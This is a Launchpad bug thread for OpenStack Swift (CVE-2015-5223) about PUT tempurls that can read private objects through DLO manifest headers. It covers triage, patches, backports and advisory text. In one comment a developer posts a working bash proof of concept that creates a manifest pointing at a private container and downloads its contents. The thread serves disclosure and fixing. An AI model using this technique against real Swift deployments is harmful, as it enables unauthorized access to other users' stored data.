| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-06-12: |  |  | [#5](/swift/%2Bbug/1453948/comments/5) |
| --- | --- | --- | --- |

I'm not sure if this is a class B1 or class A bug yet. I definitely think this needs to be fixed on master. If we do end up blocking DLOs with tempurls (or at least creating DLOs with tempurls), then we need to decide if it's better to leave old versions vulnerable or change their behavior with a security update. My default response is to fix the bug and backport it.

I'm not sure if this is a class B1 or class A bug yet. I definitely think this needs to be fixed on master. If we do end up blocking DLOs with tempurls (or at least creating DLOs with tempurls), then we need to decide if it's better to leave old versions vulnerable or change their behavior with a security update. My default response is to fix the bug and backport it.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2015-06-15: |  |  | [#6](/swift/%2Bbug/1453948/comments/6) |
| --- | --- | --- | --- |

Alright, so if it's a class A, then we could update the impact description of [bug 1449212](/bugs/1449212) to cover both bug within the same advisory.

Else, then let's get OSSG on board for this one to work on a security note.

Alright, so if it's a class A, then we could update the impact description of bug 1449212 to cover both bug within the same advisory.
Else, then let's get OSSG on board for this one to work on a security note.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-06-23: |  |  | [#7](/swift/%2Bbug/1453948/comments/7) |
| --- | --- | --- | --- |

* [400 PUT tempurls that have a x-object-manifest header](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4418957/%2Bfiles/fix-tempurl-dlo-surprise.patch)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4418957)
  (7.2 KiB,
  text/plain)

sorry, been busy - attached patch for review

Here's some bash that works on a swift-all-in-one to get you started:

#!/bin/bash

    # resetswift

    set -e

    echo "password" > secret

    swift upload private secret

    swift post -H 'x-account-meta-temp-url-key: mykey'

    # create a container for people to upload stuff too

    swift post public

    # attacker: "yes hello, can I have a safe place to upload some of my data?"

    PUT\_TEMPURL\_SIG="$(swift tempurl PUT 60 /v1/AUTH\_test/public/your-thing mykey)"

    curl -XPUT -H 'x-object-manifest: private/secret' "<http://localhost:8080>${PUT\_TEMPURL\_SIG}" -d ''

    # attacker: "oh yes, that data I just uploaded - can I download it please?"

    PUT\_TEMPURL\_SIG="$(swift tempurl GET 60 /v1/AUTH\_test/public/your-thing mykey)"

    # attacker: only... it's not \*MY\* data - trolrolrololollolo

    echo ""

    echo "\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*"

    curl "<http://localhost:8080>${PUT\_TEMPURL\_SIG}"

    echo ""

    echo "\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*"

sorry, been busy - attached patch for review
Here's some bash that works on a swift-all-in-one to get you started:
#!/bin/bash
# resetswift
set -e
echo "password" > secret
swift upload private secret
swift post -H 'x-account-meta-temp-url-key: mykey'
# create a container for people to upload stuff too
swift post public
# attacker: "yes hello, can I have a safe place to upload some of my data?"
PUT\_TEMPURL\_SIG="$(swift tempurl PUT 60 /v1/AUTH\_test/public/your-thing mykey)"
curl -XPUT -H 'x-object-manifest: private/secret' "http://localhost:8080${PUT\_TEMPURL\_SIG}" -d ''
# attacker: "oh yes, that data I just uploaded - can I download it please?"
PUT\_TEMPURL\_SIG="$(swift tempurl GET 60 /v1/AUTH\_test/public/your-thing mykey)"
# attacker: only... it's not \*MY\* data - trolrolrololollolo
echo ""
echo "\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*"
curl "http://localhost:8080${PUT\_TEMPURL\_SIG}"
echo ""
echo "\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*"

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Robert Clark (robert-clark)](https://launchpad.net/~robert-clark) wrote on 2015-07-06: |  |  | [#8](/swift/%2Bbug/1453948/comments/8) |
| --- | --- | --- | --- |

Looks like class A to me, not overly complicated to exploit given the right situation...

Looks like class A to me, not overly complicated to exploit given the right situation...

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-07-22: |  |  | [#9](/swift/%2Bbug/1453948/comments/9) |
| --- | --- | --- | --- |

Clay, the patch looks fine except that I can't make the functests fail with patched or unpatched server code. I'm always getting a 201 for the object PUTs.

Clay, the patch looks fine except that I can't make the functests fail with patched or unpatched server code. I'm always getting a 201 for the object PUTs.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-07-22: |  |  | [#10](/swift/%2Bbug/1453948/comments/10) |
| --- | --- | --- | --- |

ah I think I forgot some else: self.fail('request did not error') sorta lines in there - nice catch! #willfix

ah I think I forgot some else: self.fail('request did not error') sorta lines in there - nice catch! #willfix

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Kota Tsuyuzaki (tsuyuzaki-kota)](https://launchpad.net/~tsuyuzaki-kota) wrote on 2015-07-24: |  |  | [#11](/swift/%2Bbug/1453948/comments/11) |
| --- | --- | --- | --- |

* [fix-tempurl-for-clayg.diff](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4433373/%2Bfiles/fix-tempurl-for-clayg.diff)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4433373)
  (7.3 KiB,
  text/plain)

@Clay

Here for you adding the self.fail to functional if manifest file upload succeeded.

Code looks good but just a question from me. Is this bug already defined as class A? If so, no problem to merge attached patch I guess.

However, if classified as B or so, I am wondering if we could take another option (or not? I'm not sure) that we can add 'x-object-manifest' to incoming\_remove\_headers at tempurl config as default. The way I'm now suggesting here allows to put object with 'x-object-manifest' header (will succeed as 201) but actually Swift will store the empty object w/o the header. The reason I talk about this is that currently Swift doesn't block similar uploading case for \*SLO\*. Note that SLO doesn't have security issue like this for now because tempurl PUT seems to drop "multipart-manifest=put" query. Therefore "blocking as 400" vs "Allowing to store but modified silently like SLO".

@Clay
Here for you adding the self.fail to functional if manifest file upload succeeded.
Code looks good but just a question from me. Is this bug already defined as class A? If so, no problem to merge attached patch I guess.
However, if classified as B or so, I am wondering if we could take another option (or not? I'm not sure) that we can add 'x-object-manifest' to incoming\_remove\_headers at tempurl config as default. The way I'm now suggesting here allows to put object with 'x-object-manifest' header (will succeed as 201) but actually Swift will store the empty object w/o the header. The reason I talk about this is that currently Swift doesn't block similar uploading case for \*SLO\*. Note that SLO doesn't have security issue like this for now because tempurl PUT seems to drop "multipart-manifest=put" query. Therefore "blocking as 400" vs "Allowing to store but modified silently like SLO".

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-07-24: |  |  | [#12](/swift/%2Bbug/1453948/comments/12) |
| --- | --- | --- | --- |

* [fix-patch-for-kota.patch](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4433396/%2Bfiles/fix-patch-for-kota.patch)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4433396)
  (7.4 KiB,
  text/plain)

@Kota I want the explicit error because if someone is trying to make a dlo via tempurl they are either

a) trying to validate this security hole and they will know they are patched/hozed by the 400

b) trying to use this vulnerability as a make shift temporary-large-object-upload feature and should be told explicitly that we have broken this workflow because it was not safe and they will need to force us to implement some support for this use case (probably via for tempurl signatures in slo's FWIW).

I retested Kota's patch and I think the only thing that is missing is the Co-Author line ;)

@Kota I want the explicit error because if someone is trying to make a dlo via tempurl they are either
a) trying to validate this security hole and they will know they are patched/hozed by the 400
b) trying to use this vulnerability as a make shift temporary-large-object-upload feature and should be told explicitly that we have broken this workflow because it was not safe and they will need to force us to implement some support for this use case (probably via for tempurl signatures in slo's FWIW).
I retested Kota's patch and I think the only thing that is missing is the Co-Author line ;)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Kota Tsuyuzaki (tsuyuzaki-kota)](https://launchpad.net/~tsuyuzaki-kota) wrote on 2015-07-24: |  |  | [#13](/swift/%2Bbug/1453948/comments/13) |
| --- | --- | --- | --- |

@Clay That totally makes me sense and I agreed we should show the error explicitly. And thanks for adding me to the co-author line :)

@Clay That totally makes me sense and I agreed we should show the error explicitly. And thanks for adding me to the co-author line :)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-07-27: |  |  | [#14](/swift/%2Bbug/1453948/comments/14) |
| --- | --- | --- | --- |

@Clay, the patch in #12 looks good.

Consider this my +2, which gives us 2 (from Kota's in #13).

We'll need to get backports here, and it looks like we don't have a CVE description yet. I'm not sure what the next step is there.

@Clay, the patch in #12 looks good.
Consider this my +2, which gives us 2 (from Kota's in #13).
We'll need to get backports here, and it looks like we don't have a CVE description yet. I'm not sure what the next step is there.

| **description**: | updated |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-07-29: |  |  | [#15](/swift/%2Bbug/1453948/comments/15) |
| --- | --- | --- | --- |

* [tempurl.patch](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4435635/%2Bfiles/tempurl.patch)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4435635)
  (7.6 KiB,
  text/plain)

attached is the exact same patch (including commit message, date, and author) except formatted with `git format-patch` so that `git am <file.patch` will apply it cleanly.

I am working on backport patches for juno and kilo, but I still have a few unit test errors there.

attached is the exact same patch (including commit message, date, and author) except formatted with `git format-patch` so that `git am <file.patch` will apply it cleanly.
I am working on backport patches for juno and kilo, but I still have a few unit test errors there.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-07-29: |  |  | [#16](/swift/%2Bbug/1453948/comments/16) |
| --- | --- | --- | --- |

* [juno-tempurl-bp.patch](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4435840/%2Bfiles/juno-tempurl-bp.patch)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4435840)
  (7.6 KiB,
  text/plain)

backport for juno. This is based off of the proposed juno backport in <https://review.openstack.org/#/q/Id179513c6010d827cbcbdda7692a920e29213bcb,n,z>

backport for juno. This is based off of the proposed juno backport in https://review.openstack.org/#/q/Id179513c6010d827cbcbdda7692a920e29213bcb,n,z

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-07-29: |  |  | [#17](/swift/%2Bbug/1453948/comments/17) |
| --- | --- | --- | --- |

* [kilo-tempurl-bp.patch](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4435842/%2Bfiles/kilo-tempurl-bp.patch)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4435842)
  (7.6 KiB,
  text/plain)

backport for kilo. This is based off of the proposed juno backport in <https://review.openstack.org/#/q/Id179513c6010d827cbcbdda7692a920e29213bcb,n,z>

backport for kilo. This is based off of the proposed juno backport in https://review.openstack.org/#/q/Id179513c6010d827cbcbdda7692a920e29213bcb,n,z

| Changed in swift: | |
| --- | --- |
| **importance**: | Undecided → Critical |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2015-08-04: |  |  | [#18](/swift/%2Bbug/1453948/comments/18) |
| --- | --- | --- | --- |

@notmyname, would it makes sense to solve both [bug 1453948](/bugs/1453948) and [bug 1449212](/bugs/1449212) with a single OSSA/CVE ? If so, would that updated impact description good enough to cover both cases ?

Title: Information leak via Swift tempurls

Reporter: Richard Hawkins (Rackspace)

Products: Swift

Affects: versions through 2.2.0, and 2.2.1 versions through 2.3.0

Description:

Richard Hawkins from Rackspace reported a vulnerability in Swift tempurls. When in possession of a tempurl key for a Swift container, a malicious actor may retrieve objects within any other containers for the same Swift account (tenant). All Swift setup are affected.

@notmyname, would it makes sense to solve both bug 1453948 and bug 1449212 with a single OSSA/CVE ? If so, would that updated impact description good enough to cover both cases ?
Title: Information leak via Swift tempurls
Reporter: Richard Hawkins (Rackspace)
Products: Swift
Affects: versions through 2.2.0, and 2.2.1 versions through 2.3.0
Description:
Richard Hawkins from Rackspace reported a vulnerability in Swift tempurls. When in possession of a tempurl key for a Swift container, a malicious actor may retrieve objects within any other containers for the same Swift account (tenant). All Swift setup are affected.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Alistair Coles (alistair-coles)](https://launchpad.net/~alistair-coles) wrote on 2015-08-05: |  |  | [#19](/swift/%2Bbug/1453948/comments/19) |
| --- | --- | --- | --- |

* [anc-tempurl-dlo-POST-regression](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4439702/%2Bfiles/anc-tempurl-dlo-POST-regression)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4439702)
  (3.2 KiB,
  text/plain)

I'm +2 for the patch in #15

The tests do not cover POST requests. The fix does so there is no vulnerability with a POST but I think it would be worth adding a test to prevent a regression of the kind illustrated in the attached diff (diff wrt patch from #15). I can propose that to master after this fix is released.

I'm +2 for the patch in #15
The tests do not cover POST requests. The fix does so there is no vulnerability with a POST but I think it would be worth adding a test to prevent a regression of the kind illustrated in the attached diff (diff wrt patch from #15). I can propose that to master after this fix is released.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Alistair Coles (alistair-coles)](https://launchpad.net/~alistair-coles) wrote on 2015-08-05: |  |  | [#20](/swift/%2Bbug/1453948/comments/20) |
| --- | --- | --- | --- |

* [anc-tempurl-dlo-POST-test](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4439705/%2Bfiles/anc-tempurl-dlo-POST-test)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4439705)
  (4.1 KiB,
  text/plain)

FWIW Here's a suggested diff wrt patch at #15 for extra test coverage of POSTs. But I repeat I am +2 for merging patch at #15 as it is and following up with the extra tests.

FWIW Here's a suggested diff wrt patch at #15 for extra test coverage of POSTs. But I repeat I am +2 for merging patch at #15 as it is and following up with the extra tests.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-08-10: |  |  | [#21](/swift/%2Bbug/1453948/comments/21) |
| --- | --- | --- | --- |

Updated report description:

Title: Information leak via Swift tempurls

Reporter: Richard Hawkins and Swift core reviewers

Products: Swift

Affects: versions through 2.3.0

Description:

Richard Hawkins and Swift core reviewers reported a vulnerability in Swift tempurls. When in possession of a tempurl key authorized for PUT, a malicious actor may retrieve other objects in the same Swift account (tenant). All Swift setup are affected.

Updated report description:
Title: Information leak via Swift tempurls
Reporter: Richard Hawkins and Swift core reviewers
Products: Swift
Affects: versions through 2.3.0
Description:
Richard Hawkins and Swift core reviewers reported a vulnerability in Swift tempurls. When in possession of a tempurl key authorized for PUT, a malicious actor may retrieve other objects in the same Swift account (tenant). All Swift setup are affected.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2015-08-17: |  |  | [#22](/swift/%2Bbug/1453948/comments/22) |
| --- | --- | --- | --- |

Thanks John.

Adding affiliation back to description:

Title: Information leak via Swift tempurls

Reporter: Richard Hawkins (Rackspace) and Swift core reviewers

Products: Swift

Affects: versions through 2.3.0

Description:

Richard Hawkins from Rackspace and Swift core reviewers reported a vulnerability in Swift tempurls. When in possession of a tempurl key authorized for PUT, a malicious actor may retrieve other objects in the same Swift account (tenant). All Swift setup are affected.

Thanks John.
Adding affiliation back to description:
Title: Information leak via Swift tempurls
Reporter: Richard Hawkins (Rackspace) and Swift core reviewers
Products: Swift
Affects: versions through 2.3.0
Description:
Richard Hawkins from Rackspace and Swift core reviewers reported a vulnerability in Swift tempurls. When in possession of a tempurl key authorized for PUT, a malicious actor may retrieve other objects in the same Swift account (tenant). All Swift setup are affected.

| Changed in ossa: | |
| --- | --- |
| **status**: | Incomplete → Triaged |
| **assignee**: | nobody → Tristan Cacqueray (tristan-cacqueray) |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2015-08-19: |  |  | [#23](/swift/%2Bbug/1453948/comments/23) |
| --- | --- | --- | --- |

As for the required patchs to fix the bug describe above:

master/liberty: [bug 1453948](/bugs/1453948) comment #15, [bug 1449212](/bugs/1449212) comment #85

stable/kilo: [bug 1453948](/bugs/1453948) comment #17, [bug 1449212](/bugs/1449212) comment #90

stable/juno: [bug 1453948](/bugs/1453948) comment #16

Seems like all the patch have now been pre-approved. Should we requests a CVE with description in comment #22 and set this disclosure date:

2015-08-25, 1500UTC

As for the required patchs to fix the bug describe above:
master/liberty: bug 1453948 comment #15, bug 1449212 comment #85
stable/kilo: bug 1453948 comment #17, bug 1449212 comment #90
stable/juno: bug 1453948 comment #16
Seems like all the patch have now been pre-approved. Should we requests a CVE with description in comment #22 and set this disclosure date:
2015-08-25, 1500UTC

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-08-19: |  |  | [#24](/swift/%2Bbug/1453948/comments/24) |
| --- | --- | --- | --- |

The impact description in comment #22 looks fine, though I'd say "all Swift setups" rather than "all Swift setup" (minor grammar nit).

I'm good with the proposed Tuesday, August 25 disclosure, since that gives ample time for us to notify downstream stakeholders. As a reminder, this is intended to cover bugs 1453948 and 1449212.

The impact description in comment #22 looks fine, though I'd say "all Swift setups" rather than "all Swift setup" (minor grammar nit).
I'm good with the proposed Tuesday, August 25 disclosure, since that gives ample time for us to notify downstream stakeholders. As a reminder, this is intended to cover bugs 1453948 and 1449212.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-08-19: |  |  | [#25](/swift/%2Bbug/1453948/comments/25) |
| --- | --- | --- | --- |

looks good

looks good

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2015-08-19

| Changed in ossa: | |
| --- | --- |
| **status**: | Triaged → In Progress |

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2015-08-19

| **summary**: | - all PUT tempurls leak existence via DLO manifest attack+ all PUT tempurls leak existence via DLO manifest attack (CVE-2015-5223) |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2015-08-20:  [**Re: all PUT tempurls leak existence via DLO manifest attack (CVE-2015-5223)**](/swift/%2Bbug/1453948/comments/26) |  |  | [#26](/swift/%2Bbug/1453948/comments/26) |
| --- | --- | --- | --- |

Disclosure date (extended by one day):

2015-08-26, 1500UTC

Disclosure date (extended by one day):
2015-08-26, 1500UTC

| Changed in ossa: | |
| --- | --- |
| **status**: | In Progress → Fix Committed |

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2015-08-26

| **information type**: | Private Security → Public Security |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-08-26:  [**Fix proposed to swift (stable/kilo)**](/swift/%2Bbug/1453948/comments/27) |  |  | [#27](/swift/%2Bbug/1453948/comments/27) |
| --- | --- | --- | --- |

Fix proposed to branch: stable/kilo

Review: <https://review.openstack.org/217254>

Fix proposed to branch: stable/kilo
Review: https://review.openstack.org/217254

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-08-26:  [**Related fix proposed to swift (master)**](/swift/%2Bbug/1453948/comments/28) |  |  | [#28](/swift/%2Bbug/1453948/comments/28) |
| --- | --- | --- | --- |

Related fix proposed to branch: master

Review: <https://review.openstack.org/217273>

Related fix proposed to branch: master
Review: https://review.openstack.org/217273

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2015-08-26

| **summary**: | - all PUT tempurls leak existence via DLO manifest attack (CVE-2015-5223)+ [OSSA 2015-016] all PUT tempurls leak existence via DLO manifest attack+ (CVE-2015-5223) |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-08-27:  [**Fix merged to swift (stable/juno)**](/swift/%2Bbug/1453948/comments/29) |  |  | [#29](/swift/%2Bbug/1453948/comments/29) |
| --- | --- | --- | --- |

Reviewed: <https://review.openstack.org/217253>

Committed: <https://git.openstack.org/cgit/openstack/swift/commit/?id=0694e1911d10a18075ff99462c96781372422b2c>

Submitter: Jenkins

Branch: stable/juno

commit 0694e1911d10a18075ff99462c96781372422b2c

Author: Clay Gerrard <email address hidden>

Date: Thu Jul 23 22:36:21 2015 -0700

Disallow unsafe tempurl operations to point to unauthorized data

Do not allow PUT tempurls to create pointers to other data. Specifically

    disallow the creation of DLO object manifests by returning an error if a

    non-safe tempurl request includes an X-Object-Manifest header regardless of

    the value of the header.

This prevents discoverability attacks which can use any PUT tempurl to probe

    for private data by creating a DLO object manifest and then using the PUT

    tempurl to head the object which would 404 if the prefix does not match any

    object data or form a valid DLO HEAD response if it does.

This also prevents a tricky and potentially unexpected consequence of PUT

    tempurls which would make it unsafe to allow a user to download objects

    created by tempurl (even if they just created them) because the result of

    reading the object created via tempurl may not be the data which was uploaded.

[CVE-2015-5223]

Co-Authored-By: Kota Tsuyuzaki <email address hidden>

Closes-Bug: 1453948

Change-Id: I91161dfb0f089c3990aca1b4255b520299ef73c8

Reviewed: https://review.openstack.org/217253
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=0694e1911d10a18075ff99462c96781372422b2c
Submitter: Jenkins
Branch: stable/juno
commit 0694e1911d10a18075ff99462c96781372422b2c
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Jul 23 22:36:21 2015 -0700
Disallow unsafe tempurl operations to point to unauthorized data
Do not allow PUT tempurls to create pointers to other data. Specifically
disallow the creation of DLO object manifests by returning an error if a
non-safe tempurl request includes an X-Object-Manifest header regardless of
the value of the header.
This prevents discoverability attacks which can use any PUT tempurl to probe
for private data by creating a DLO object manifest and then using the PUT
tempurl to head the object which would 404 if the prefix does not match any
object data or form a valid DLO HEAD response if it does.
This also prevents a tricky and potentially unexpected consequence of PUT
tempurls which would make it unsafe to allow a user to download objects
created by tempurl (even if they just created them) because the result of
reading the object created via tempurl may not be the data which was uploaded.
[CVE-2015-5223]
Co-Authored-By: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Closes-Bug: 1453948
Change-Id: I91161dfb0f089c3990aca1b4255b520299ef73c8

| **tags**: | added: in-stable-juno |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-08-27:  [**Fix merged to swift (master)**](/swift/%2Bbug/1453948/comments/30) |  |  | [#30](/swift/%2Bbug/1453948/comments/30) |
| --- | --- | --- | --- |

Reviewed: <https://review.openstack.org/217259>

Committed: <https://git.openstack.org/cgit/openstack/swift/commit/?id=10b2939b433a4a79b4f7b97640b3d208cacfeffb>

Submitter: Jenkins

Branch: master

commit 10b2939b433a4a79b4f7b97640b3d208cacfeffb

Author: Clay Gerrard <email address hidden>

Date: Thu Jul 23 22:36:21 2015 -0700

Disallow unsafe tempurl operations to point to unauthorized data

Do not allow PUT tempurls to create pointers to other data. Specifically

    disallow the creation of DLO object manifests by returning an error if a

    non-safe tempurl request includes an X-Object-Manifest header regardless of

    the value of the header.

This prevents discoverability attacks which can use any PUT tempurl to probe

    for private data by creating a DLO object manifest and then using the PUT

    tempurl to head the object which would 404 if the prefix does not match any

    object data or form a valid DLO HEAD response if it does.

This also prevents a tricky and potentially unexpected consequence of PUT

    tempurls which would make it unsafe to allow a user to download objects

    created by tempurl (even if they just created them) because the result of

    reading the object created via tempurl may not be the data which was uploaded.

[CVE-2015-5223]

Co-Authored-By: Kota Tsuyuzaki <email address hidden>

Change-Id: I11e68830009d3f6bff44ae4011a41b67139146f6

    Closes-Bug: 1453948

Reviewed: https://review.openstack.org/217259
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=10b2939b433a4a79b4f7b97640b3d208cacfeffb
Submitter: Jenkins
Branch: master
commit 10b2939b433a4a79b4f7b97640b3d208cacfeffb
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Jul 23 22:36:21 2015 -0700
Disallow unsafe tempurl operations to point to unauthorized data
Do not allow PUT tempurls to create pointers to other data. Specifically
disallow the creation of DLO object manifests by returning an error if a
non-safe tempurl request includes an X-Object-Manifest header regardless of
the value of the header.
This prevents discoverability attacks which can use any PUT tempurl to probe
for private data by creating a DLO object manifest and then using the PUT
tempurl to head the object which would 404 if the prefix does not match any
object data or form a valid DLO HEAD response if it does.
This also prevents a tricky and potentially unexpected consequence of PUT
tempurls which would make it unsafe to allow a user to download objects
created by tempurl (even if they just created them) because the result of
reading the object created via tempurl may not be the data which was uploaded.
[CVE-2015-5223]
Co-Authored-By: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Change-Id: I11e68830009d3f6bff44ae4011a41b67139146f6
Closes-Bug: 1453948

| Changed in swift: | |
| --- | --- |
| **status**: | Confirmed → Fix Committed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-08-27:  [**Fix merged to swift (stable/kilo)**](/swift/%2Bbug/1453948/comments/31) |  |  | [#31](/swift/%2Bbug/1453948/comments/31) |
| --- | --- | --- | --- |

Reviewed: <https://review.openstack.org/217254>

Committed: <https://git.openstack.org/cgit/openstack/swift/commit/?id=410778b86a49702f80b734bdbf2480b86db342e2>

Submitter: Jenkins

Branch: stable/kilo

commit 410778b86a49702f80b734bdbf2480b86db342e2

Author: Clay Gerrard <email address hidden>

Date: Thu Jul 23 22:36:21 2015 -0700

Disallow unsafe tempurl operations to point to unauthorized data

Do not allow PUT tempurls to create pointers to other data. Specifically

    disallow the creation of DLO object manifests by returning an error if a

    non-safe tempurl request includes an X-Object-Manifest header regardless of

    the value of the header.

This prevents discoverability attacks which can use any PUT tempurl to probe

    for private data by creating a DLO object manifest and then using the PUT

    tempurl to head the object which would 404 if the prefix does not match any

    object data or form a valid DLO HEAD response if it does.

This also prevents a tricky and potentially unexpected consequence of PUT

    tempurls which would make it unsafe to allow a user to download objects

    created by tempurl (even if they just created them) because the result of

    reading the object created via tempurl may not be the data which was uploaded.

[CVE-2015-5223]

Co-Authored-By: Kota Tsuyuzaki <email address hidden>

Closes-Bug: 1453948

Change-Id: I91161dfb0f089c3990aca1b4255b520299ef73c8

Reviewed: https://review.openstack.org/217254
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=410778b86a49702f80b734bdbf2480b86db342e2
Submitter: Jenkins
Branch: stable/kilo
commit 410778b86a49702f80b734bdbf2480b86db342e2
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Jul 23 22:36:21 2015 -0700
Disallow unsafe tempurl operations to point to unauthorized data
Do not allow PUT tempurls to create pointers to other data. Specifically
disallow the creation of DLO object manifests by returning an error if a
non-safe tempurl request includes an X-Object-Manifest header regardless of
the value of the header.
This prevents discoverability attacks which can use any PUT tempurl to probe
for private data by creating a DLO object manifest and then using the PUT
tempurl to head the object which would 404 if the prefix does not match any
object data or form a valid DLO HEAD response if it does.
This also prevents a tricky and potentially unexpected consequence of PUT
tempurls which would make it unsafe to allow a user to download objects
created by tempurl (even if they just created them) because the result of
reading the object created via tempurl may not be the data which was uploaded.
[CVE-2015-5223]
Co-Authored-By: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Closes-Bug: 1453948
Change-Id: I91161dfb0f089c3990aca1b4255b520299ef73c8

| **tags**: | added: in-stable-kilo |
| --- | --- |

[Thierry Carrez (ttx)](https://launchpad.net/~ttx)
on 2015-09-01

| Changed in swift: | |
| --- | --- |
| **milestone**: | none → 2.4.0 |
| **status**: | Fix Committed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-09-02:  [**Fix proposed to swift (feature/crypto)**](/swift/%2Bbug/1453948/comments/32) |  |  | [#32](/swift/%2Bbug/1453948/comments/32) |
| --- | --- | --- | --- |

Fix proposed to branch: feature/crypto

Review: <https://review.openstack.org/219775>

Fix proposed to branch: feature/crypto
Review: https://review.openstack.org/219775

Revision history for this message
